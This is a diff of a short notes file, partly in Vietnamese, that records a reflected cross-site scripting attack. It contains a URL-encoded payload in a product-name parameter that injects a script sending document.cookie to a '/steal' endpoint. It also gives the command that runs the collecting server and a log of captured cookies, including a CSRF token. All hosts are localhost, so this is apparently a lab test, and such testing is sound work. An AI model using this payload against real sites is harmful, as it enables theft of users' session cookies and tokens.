@@ -1,2 +1,9 @@
 http://localhost:8082/danh-sach-ma-giam-gia?activeTab=product-discount&productName=%22%3E%3Cscript%3Efetch%28%27http%3A%2F%2Flocalhost%3A8000%2Fsteal%3Fcookie%3D%27%2BencodeURIComponent%28document.cookie%29%29.catch%28console.error%29%3C%2Fscript%3E
 uvicorn main:app --reload --port 8000
+
+thông tin log cookie trộm được : 2025-05-26 22:06:31,734 2025-05-27 00:27:26,405 - Received cookies:
+2025-05-27 00:27:26,406 - ajs_anonymous_id = 084a5a42-bc16-426c-9319-2f466627286a
+2025-05-27 00:27:26,406 - csrftoken = WjA2XzhLxFtb3XQBPIDBqETDbyvkGIoa
+2025-05-27 00:27:26,406 - language = en
+2025-05-27 00:27:26,406 - welcomebanner_status = dismiss
+2025-05-27 00:27:26,406 - cookieconsent_status = dismiss
